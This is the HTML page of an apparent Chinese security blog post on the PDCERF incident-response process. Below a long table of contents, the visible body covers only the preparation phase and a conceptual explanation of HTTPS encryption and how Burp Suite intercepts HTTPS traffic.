<!DOCTYPE html>
<html><head>
<title>应急响应流程和网络安全常识</title>




<meta charset="utf-8">
<meta name="X-UA-Compatible" content="IE=edge">
<meta name="google-site-verification" content="">
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
<meta content="telephone=no" name="format-detection">
<meta name="description" content="pdcerf">
<meta name="renderer" content="webkit">
<meta name="theme-color" content="#ffffff">



<meta property="og:title" content="应急响应流程和网络安全常识" />
<meta property="og:description" content="pdcerf" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://xxxhidexxx.github.io/posts/sec/pdcerf/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-04-18T00:00:00+00:00" />
<meta property="article:modified_time" content="2024-04-18T00:00:00+00:00" /><meta property="og:site_name" content="My Blog" />






<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="应急响应流程和网络安全常识"/>
<meta name="twitter:description" content="pdcerf"/>









<script type="text/javascript">
  (function(c,l,a,r,i,t,y){
      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
  })(window, document, "clarity", "script", "abcdefghzd");
</script>



  






      <script src="/js/toc.js"></script>
    
    <link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">

<link rel="stylesheet" href="/scss/dark-mode.min.cb53f1bee2b8900cb4f082afbf00175d6618f281cf9a2fe8619e3b52d20b5721.css" integrity="sha256-y1PxvuK4kAy08IKvvwAXXWYY8oHPmi/oYZ47UtILVyE=" media="screen">


<link rel="stylesheet"
          href="https://fonts.googleapis.com/css?family=Material+Icons">




<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"></script>
<script>
    document.addEventListener("DOMContentLoaded", function() {
        renderMathInElement(document.body, {
          
          
          delimiters: [
              {left: '$$', right: '$$', display: true},
              {left: '$', right: '$', display: false},
              {left: '\\(', right: '\\)', display: false},
              {left: '\\[', right: '\\]', display: true}
          ],
          
          throwOnError : false
        });
    });
</script>
















</head>
<body>
    	<div id="app"><div class="single-column-drawer-container" id="drawer"
     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
    <div class="drawer-content">
        <div class="drawer-menu">
            
            
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/categories">
                    分类
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/tags">
                    标签
                </a>
                
            
            
            <div class="toc">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e5%87%86%e5%a4%87" class="nav-准备">
									准备
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#https-%e5%8a%a0%e5%af%86%e5%8e%9f%e7%90%86%e6%8a%93%e5%8c%85%e5%b7%a5%e5%85%b7%e6%80%8e%e4%b9%88%e6%88%aa%e8%8e%b7%e6%98%8e%e6%96%87-https-%e6%8a%a5%e6%96%87" class="nav-https-加密原理抓包工具怎么截获明文-https-报文">
									https 加密原理，抓包工具怎么截获明文 https 报文
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#java-%e5%86%85%e5%ad%98%e9%a9%ac%e7%9a%84%e5%8e%9f%e7%90%86" class="nav-java-内存马的原理">
									java 内存马的原理
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%b8%b8%e8%a7%81%e5%ae%89%e5%85%a8%e8%ae%be%e5%a4%87%e7%9a%84%e7%a7%8d%e7%b1%bb%e5%92%8c%e5%8a%9f%e8%83%bd" class="nav-常见安全设备的种类和功能">
									常见安全设备的种类和功能
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#windows-%e6%97%a5%e5%bf%97%e6%96%87%e4%bb%b6" class="nav-windows-日志文件">
									windows 日志文件
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#linux-%e6%97%a5%e5%bf%97%e6%96%87%e4%bb%b6" class="nav-linux-日志文件">
									linux 日志文件
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#linux-%e6%97%a5%e5%bf%97%e5%88%86%e6%9e%90%e5%b8%b8%e7%94%a8%e5%91%bd%e4%bb%a4" class="nav-linux-日志分析常用命令">
									linux 日志分析常用命令
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e7%bb%99%e4%bd%a0%e4%b8%80%e4%b8%aa%e6%af%94%e8%be%83%e5%a4%a7%e7%9a%84%e6%97%a5%e5%bf%97%e5%ba%94%e8%af%a5%e5%a6%82%e4%bd%95%e5%88%86%e6%9e%90" class="nav-给你一个比较大的日志应该如何分析">
									给你一个比较大的日志，应该如何分析
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#tcpip-%e5%9b%9b%e5%b1%82%e6%9e%b6%e6%9e%84%e5%af%b9%e5%ba%94%e7%9a%84%e5%b8%b8%e8%a7%81%e7%bd%91%e7%bb%9c%e5%8d%8f%e8%ae%ae" class="nav-tcpip-四层架构对应的常见网络协议">
									tcp/ip 四层架构对应的常见网络协议
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#tcp-%e5%92%8c-udp-%e7%9a%84%e5%8c%ba%e5%88%ab" class="nav-tcp-和-udp-的区别">
									tcp 和 udp 的区别
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#dns-%e4%bd%bf%e7%94%a8%e7%9a%84%e6%98%af-tcp-%e8%bf%98%e6%98%af-udp" class="nav-dns-使用的是-tcp-还是-udp">
									dns 使用的是 tcp 还是 udp
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%bb%80%e4%b9%88%e6%98%af-ipv4-%e5%9c%b0%e5%9d%80%e7%9a%84-a-%e6%ae%b5-b-%e6%ae%b5-c-%e6%ae%b5%e5%ad%90%e7%bd%91%e6%8e%a9%e7%a0%81%e6%9c%89%e4%bb%80%e4%b9%88%e4%bd%9c%e7%94%a8" class="nav-什么是-ipv4-地址的-a-段-b-段-c-段子网掩码有什么作用">
									什么是 ipv4 地址的 a 段 b 段 c 段，子网掩码有什么作用
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%bb%80%e4%b9%88%e6%98%af-webshell%e5%b8%b8%e8%a7%81%e7%9a%84-getshell-%e6%96%b9%e6%b3%95" class="nav-什么是-webshell常见的-getshell-方法">
									什么是 webshell，常见的 getshell 方法
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%b8%8a%e4%bc%a0-webshell-%e4%b9%8b%e5%90%8e%e6%80%8e%e6%a0%b7%e8%8e%b7%e5%be%97%e7%bb%9d%e5%af%b9%e8%b7%af%e5%be%84" class="nav-上传-webshell-之后怎样获得绝对路径">
									上传 webshell 之后怎样获得绝对路径
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#webshell-%e4%b8%8d%e5%87%ba%e7%bd%91%e5%a6%82%e4%bd%95%e5%88%a9%e7%94%a8" class="nav-webshell-不出网如何利用">
									webshell 不出网如何利用
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%ad%a3%e5%90%91%e4%bb%a3%e7%90%86%e5%92%8c%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86%e7%9a%84%e5%8c%ba%e5%88%ab%e5%92%8c%e7%94%a8%e9%80%94" class="nav-正向代理和反向代理的区别和用途">
									正向代理和反向代理的区别和用途
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%86%85%e7%bd%91%e7%a9%bf%e9%80%8f%e6%98%af%e4%bb%80%e4%b9%88" class="nav-内网穿透是什么">
									内网穿透是什么
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%b8%b8%e6%88%8f%e5%8a%a0%e9%80%9f%e5%99%a8%e4%b8%8e%e5%86%85%e7%bd%91%e7%a9%bf%e9%80%8f" class="nav-游戏加速器与内网穿透">
									游戏加速器与内网穿透
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e9%92%bb%e7%9f%b3%e7%a5%a8%e6%8d%ae%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae%e7%99%bd%e9%93%b6%e7%a5%a8%e6%8d%ae%e7%9a%84%e5%8c%ba%e5%88%ab" class="nav-钻石票据黄金票据白银票据的区别">
									钻石票据、黄金票据、白银票据的区别
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e8%ae%be%e7%bd%ae%e8%9c%9c%e7%bd%90%e7%9a%84%e6%97%b6%e5%80%99%e5%bc%80%e6%94%be%e5%93%aa%e4%ba%9b%e7%ab%af%e5%8f%a3%e7%90%86%e7%94%b1%e6%98%af%e4%bb%80%e4%b9%88" class="nav-设置蜜罐的时候开放哪些端口理由是什么">
									设置蜜罐的时候开放哪些端口，理由是什么
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%9a%b4%e5%8a%9b%e7%a0%b4%e8%a7%a3%e5%af%86%e7%a0%81%e7%9a%84%e6%97%b6%e5%80%99%e9%81%87%e5%88%b0%e7%99%bb%e5%bd%95%e5%a4%b1%e8%b4%a5%e6%ac%a1%e6%95%b0%e9%99%90%e5%88%b6%e6%80%8e%e4%b9%88%e7%bb%95%e8%bf%87" class="nav-暴力破解密码的时候遇到登录失败次数限制怎么绕过">
									暴力破解密码的时候遇到登录失败次数限制怎么绕过
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%b8%b8%e8%a7%81%e7%9a%84%e5%8f%8d%e7%88%ac%e8%99%ab%e7%ad%96%e7%95%a5" class="nav-常见的反爬虫策略">
									常见的反爬虫策略
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e7%9a%84%e6%b5%81%e7%a8%8b" class="nav-渗透测试的流程">
									渗透测试的流程
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e7%9a%84%e6%80%9d%e8%b7%af" class="nav-信息收集的思路">
									信息收集的思路
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#redis-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%98%af%e4%bb%80%e4%b9%88%e6%80%8e%e4%b9%88%e5%88%a9%e7%94%a8%e8%83%bd%e5%81%9a%e5%88%b0-rce" class="nav-redis-未授权访问是什么怎么利用能做到-rce">
									redis 未授权访问是什么，怎么利用能做到 rce
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#ssrf-%e7%94%a8-redis-%e6%8f%90%e5%8d%87%e4%b8%ba-rce" class="nav-ssrf-用-redis-提升为-rce">
									ssrf 用 redis 提升为 rce
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e7%bb%99%e5%ae%9a%e5%9f%9f%e5%90%8d%e7%bb%95%e8%bf%87-cdn-%e6%89%be%e7%9c%9f%e5%ae%9e-ip" class="nav-给定域名绕过-cdn-找真实-ip">
									给定域名绕过 cdn 找真实 ip
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e6%a3%80%e6%b5%8b" class="nav-检测">
									检测
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e4%bc%a0%e7%bb%9f%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-传统漏洞攻击流量特征">
									传统漏洞攻击流量特征
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%94%bb%e5%87%bb%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-java-反序列化攻击流量特征">
									java 反序列化攻击流量特征
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%b8%b8%e8%a7%81-webshell-%e7%ae%a1%e7%90%86%e5%b7%a5%e5%85%b7%e7%9a%84%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-常见-webshell-管理工具的流量特征">
									常见 webshell 管理工具的流量特征
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#cs-%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-cs-流量特征">
									cs 流量特征
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#msf-%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-msf-流量特征">
									msf 流量特征
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%85%b6%e4%bb%96%e7%ba%a2%e9%98%9f%e5%b7%a5%e5%85%b7%e7%9a%84%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-其他红队工具的流量特征">
									其他红队工具的流量特征
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%bb%8e%e5%87%a0%e4%b8%87%e6%9d%a1%e5%91%8a%e8%ad%a6%e4%b8%ad%e5%8c%ba%e5%88%86%e6%94%bb%e5%87%bb%e5%92%8c%e8%af%af%e6%8a%a5" class="nav-从几万条告警中区分攻击和误报">
									从几万条告警中区分攻击和误报
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%88%a4%e6%96%ad%e4%ba%8b%e4%bb%b6%e7%b1%bb%e5%9e%8b" class="nav-判断事件类型">
									判断事件类型
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%88%a4%e6%96%ad%e5%a4%b1%e9%99%b7%e8%8c%83%e5%9b%b4" class="nav-判断失陷范围">
									判断失陷范围
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%bb%8e%e5%91%8a%e8%ad%a6%e5%86%85%e7%bd%91-ip-%e7%a1%ae%e5%ae%9a%e5%9c%a8%e5%93%aa%e4%b8%80%e5%b1%82%e6%a5%bc" class="nav-从告警内网-ip-确定在哪一层楼">
									从告警内网 ip 确定在哪一层楼
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%86%85%e7%bd%91%e5%91%8a%e8%ad%a6%e7%9a%84%e5%a4%84%e7%90%86%e6%96%b9%e5%bc%8f" class="nav-内网告警的处理方式">
									内网告警的处理方式
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%80%8e%e4%b9%88%e5%88%a4%e6%96%ad%e6%9c%a8%e9%a9%ac%e6%98%af%e5%90%a6%e4%b8%8a%e4%bc%a0%e6%88%90%e5%8a%9f" class="nav-怎么判断木马是否上传成功">
									怎么判断木马是否上传成功
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%80%8e%e4%b9%88%e5%9c%a8%e7%99%be%e4%b8%87%e8%a1%8c%e4%bb%a3%e7%a0%81%e4%b8%ad%e6%89%be%e5%88%b0%e5%90%8e%e9%97%a8" class="nav-怎么在百万行代码中找到后门">
									怎么在百万行代码中找到后门
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%a4%a9%e7%9c%bc%e4%bd%bf%e7%94%a8%e7%bb%8f%e9%aa%8c" class="nav-天眼使用经验">
									天眼使用经验
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#windows-%e5%85%a5%e4%be%b5%e6%8e%92%e6%9f%a5" class="nav-windows-入侵排查">
									windows 入侵排查
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#linux-%e5%85%a5%e4%be%b5%e6%8e%92%e6%9f%a5" class="nav-linux-入侵排查">
									linux 入侵排查
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e8%b4%9f%e8%bd%bd%e5%9d%87%e8%a1%a1%e4%b9%8b%e5%90%8e%e5%a6%82%e4%bd%95%e8%8e%b7%e5%be%97%e7%9c%9f%e5%ae%9e-ip" class="nav-负载均衡之后如何获得真实-ip">
									负载均衡之后如何获得真实 ip
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e6%8a%91%e5%88%b6" class="nav-抑制">
									抑制
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e4%b8%ad%e5%8b%92%e7%b4%a2%e7%97%85%e6%af%92%e4%ba%86%e6%80%8e%e4%b9%88%e5%8a%9e" class="nav-中勒索病毒了怎么办">
									中勒索病毒了怎么办
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%b7%b2%e7%9f%a5%e6%94%bb%e5%87%bb%e8%80%85%e6%ad%a3%e5%9c%a8%e5%88%a9%e7%94%a8-log4j2-%e6%bc%8f%e6%b4%9e%e6%80%8e%e4%b9%88%e5%ba%94%e6%80%a5" class="nav-已知攻击者正在利用-log4j2-漏洞怎么应急">
									已知攻击者正在利用 log4j2 漏洞，怎么应急
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%8e%92%e6%9f%a5%e5%92%8c%e9%98%bb%e6%ad%a2%e5%86%85%e7%bd%91%e7%a7%bb%e5%8a%a8" class="nav-排查和阻止内网移动">
									排查和阻止内网移动
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#windows-%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81%e6%96%b9%e6%b3%95" class="nav-windows-权限维持方法">
									windows 权限维持方法
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#linux-%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81%e6%96%b9%e6%b3%95" class="nav-linux-权限维持方法">
									linux 权限维持方法
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#windows-%e6%8f%90%e6%9d%83" class="nav-windows-提权">
									windows 提权
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#linux-%e6%8f%90%e6%9d%83" class="nav-linux-提权">
									linux 提权
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#sql-%e7%9a%84-udf-%e6%8f%90%e6%9d%83" class="nav-sql-的-udf-提权">
									sql 的 udf 提权
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e6%a0%b9%e9%99%a4" class="nav-根除">
									根除
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e6%80%8e%e6%a0%b7%e6%8e%92%e6%9f%a5%e5%86%85%e5%ad%98%e9%a9%ac" class="nav-怎样排查内存马">
									怎样排查内存马
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%80%8e%e6%a0%b7%e6%b8%85%e9%99%a4%e5%86%85%e5%ad%98%e9%a9%ac" class="nav-怎样清除内存马">
									怎样清除内存马
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%86%85%e5%ad%98%e9%a9%ac%e6%97%a0%e6%96%87%e4%bb%b6%e8%90%bd%e5%9c%b0%e6%80%8e%e4%b9%88%e5%8f%96%e8%af%81" class="nav-内存马无文件落地怎么取证">
									内存马无文件落地，怎么取证
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#java-web-%e4%b8%ad-servletfilterlistener-%e7%9a%84%e5%8c%ba%e5%88%ab" class="nav-java-web-中-servletfilterlistener-的区别">
									java web 中 servlet/filter/listener 的区别
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#log4j2-%e5%8e%9f%e7%90%86%e5%92%8c%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-log4j2-原理和流量特征">
									log4j2 原理和流量特征
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#shiro-550-%e5%92%8c-721-%e7%9a%84%e5%8c%ba%e5%88%ab" class="nav-shiro-550-和-721-的区别">
									shiro 550 和 721 的区别
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#shiro-%e5%88%a9%e7%94%a8%e9%93%be" class="nav-shiro-利用链">
									shiro 利用链
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#fastjson-rce-%e7%9a%84%e6%b5%81%e7%a8%8b" class="nav-fastjson-rce-的流程">
									fastjson rce 的流程
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%80%8e%e6%a0%b7%e5%ae%9a%e4%bd%8d-webshell" class="nav-怎样定位-webshell">
									怎样定位 webshell
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%80%8e%e6%a0%b7%e6%b8%85%e9%99%a4-webshell" class="nav-怎样清除-webshell">
									怎样清除 webshell
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%9d%80%e4%ba%86-webshell-%e8%bf%98%e6%9c%89%e5%a4%96%e8%bf%9e%e6%b5%81%e9%87%8f%e6%80%8e%e6%a0%b7%e5%ba%94%e6%80%a5" class="nav-杀了-webshell-还有外连流量怎样应急">
									杀了 webshell 还有外连流量怎样应急
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%94%bb%e5%87%bb%e8%80%85%e6%b8%85%e7%90%86%e4%ba%86%e4%bd%9c%e6%a1%88%e7%97%95%e8%bf%b9%e6%80%8e%e4%b9%88%e5%8a%9e" class="nav-攻击者清理了作案痕迹怎么办">
									攻击者清理了作案痕迹怎么办
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%ba%af%e6%ba%90%e5%8f%8d%e5%88%b6%e6%89%8b%e6%ae%b5%e6%9c%89%e5%93%aa%e4%ba%9b" class="nav-溯源反制手段有哪些">
									溯源反制手段有哪些
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%a8%81%e8%83%81%e6%83%85%e6%8a%a5%e5%b9%b3%e5%8f%b0%e4%bd%bf%e7%94%a8%e7%bb%8f%e9%aa%8c" class="nav-威胁情报平台使用经验">
									威胁情报平台使用经验
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%bb%80%e4%b9%88%e6%98%af%e6%94%bb%e5%87%bb%e8%80%85%e7%94%bb%e5%83%8f" class="nav-什么是攻击者画像">
									什么是攻击者画像
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e6%81%a2%e5%a4%8d" class="nav-恢复">
									恢复
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e6%80%8e%e4%b9%88%e6%81%a2%e5%a4%8d%e5%a4%b1%e9%99%b7%e4%b8%bb%e6%9c%ba%e7%9a%84%e6%96%87%e4%bb%b6" class="nav-怎么恢复失陷主机的文件">
									怎么恢复失陷主机的文件
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e6%80%bb%e7%bb%93" class="nav-总结">
									总结
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e6%94%bb%e5%87%bb%e4%ba%8b%e4%bb%b6%e8%b0%83%e6%9f%a5%e6%8a%a5%e5%91%8a" class="nav-攻击事件调查报告">
									攻击事件调查报告
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%86%99%e8%bf%87%e6%8a%80%e7%ab%99%e6%b3%95%e5%90%97" class="nav-写过技站法吗">
									写过技站法吗
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
            
        </div>
    </div>
</div>
<transition name="fade">
    <div id="drawer-mask" v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
</transition>
<nav id="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
    <div id="navBackground" class="nav-background"></div>
    <div class="container container-narrow nav-content">
        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
            <i class="material-icons">
                menu
            </i>
        </button>
        <a id="navTitle" class="navbar-brand" href="https://xxxhidexxx.github.io/">
            write-up
        </a>
        
        <button type="button" class="nav-darkmode-toggle" id="darkModeToggleButton2">
            <i class="material-icons" id="darkModeToggleIcon2">
                dark_mode
            </i>
        </button>
        
    </div>
</nav>
<div class="single-column-header-container" id="pageHead"
     v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
    <a href="https://xxxhidexxx.github.io/">
        <div class="single-column-header-title">write-up</div>
        

    </a>
</div>

            <div id="content">
                <div id="streamContainer" class="stream-container">

    <div class="post-list-container post-list-container-shadow">
        <div class="post">
            
            
            

            <div class="post-head-wrapper-text-only"
                
            >
                <div class="post-title">
                    应急响应流程和网络安全常识
                    
                    <div class="post-subtitle">
                        pdcerf
                    </div>
                    
                    <div class="post-meta">
                        
                        <time itemprop="datePublished">
                            2024-04-18 00:00
                        </time>
                        

                        
                            <i class="material-icons" style="">folder</i>
                                <a href="/categories/sec">sec</a>
                                &nbsp;
                        

                        
                            <i class="material-icons" style="">label</i>
                            
                                <a href="/tags/%E8%93%9D%E9%98%9F%E7%90%86%E8%AE%BA">蓝队理论</a>
                                &nbsp;
                            
                        
                        
                    </div>
                </div>
            </div>
            
            <div class="post-body-wrapper">
                
                <div class="post-body" v-pre>
                
                    <p>pdcerf：准备-检测-抑制-根除-恢复-总结。</p>
<h3 id="准备">准备</h3>
<p>明确职责；梳理资产，梳理暴露面，关闭不必要的映射；检查弱口令和密码策略；更新漏洞补丁；确认资产开启了日志存储，可对日志进行监控、审计和溯源。</p>
<p>准备阶段首先要确定能够找到和打开日志文件。</p>
<hr>
<h4 id="https-加密原理抓包工具怎么截获明文-https-报文">https 加密原理，抓包工具怎么截获明文 https 报文</h4>
<p>http/s 本身是加密通信的，我们在抓包工具里面看到的明文数据包，是抓包工具自动截获密钥之后解密的结果。</p>
<p>https 加密方式：先使用非对称加密传输 ssl 证书并建立连接，再使用对称加密传输数据。这里非对称加密意味着只有一方需要提供 ssl 证书。</p>
<p>http 不安全的原因：对称加密导致的中间人攻击，中间人查看和篡改请求包、响应包，或者跳转到恶意网站。</p>
<p>只使用非对称加密不可行的原因：传输效率太低了。</p>
<p>burpsuite 抓 https 明文的方法就是对自己进行一次中间人攻击，分别与浏览器和服务器建立 https 连接。能够对 https 报文进行加密解密，就叫建立 https 连接。</p>
<p>burp 先是截获了服务器给浏览器的公钥。然后在 burp 上生成公私钥，将 burp 的密钥发给浏览器。之前配置 burp 的时候浏览器已经导入了 burp 的证书，这样 burp 和浏览器建立了 https 连接，使用的是 burp 的密钥，所以 burp 可以解密看到明文的 https 请求。同理，burp 再与服务器建立 https 连接，可以看到明文 https 响应。</p>
<p>数据传输的过程中 burp 有两套对称加密的密钥，分别用来和浏览器/服务器进行加密通信。</p>
